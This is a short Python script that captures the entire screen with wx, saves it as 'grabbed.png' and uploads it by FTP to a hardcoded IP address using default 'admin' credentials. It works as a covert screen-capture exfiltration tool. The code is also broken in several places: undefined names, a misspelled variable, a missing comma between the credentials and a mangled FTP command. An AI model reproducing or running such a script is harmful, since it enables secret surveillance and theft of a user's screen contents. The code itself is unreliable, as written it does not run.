import wx
import os
import ftplib

w = wxApp()
screen = wx.ScreenDC()
size = screen.GetSize()
bmap = wxBitmap(size[0],size[1])
memo = wx.MemoryDC(bmap)
mem.Blit(0,0,size[0],size[1],screen,0,0)

del memo
bmap.SaveFile("grabbed.png", wx.BITMAP_TYPE_PNG)

sess_ = ftplib.FTP("192.168.119.185", "admin" "admin")
file = open("grabbed.png", "rb")
sess_.storbinary("STTOOR /tmp/grabbed.png", file_)

file.close()
sess_.quit()
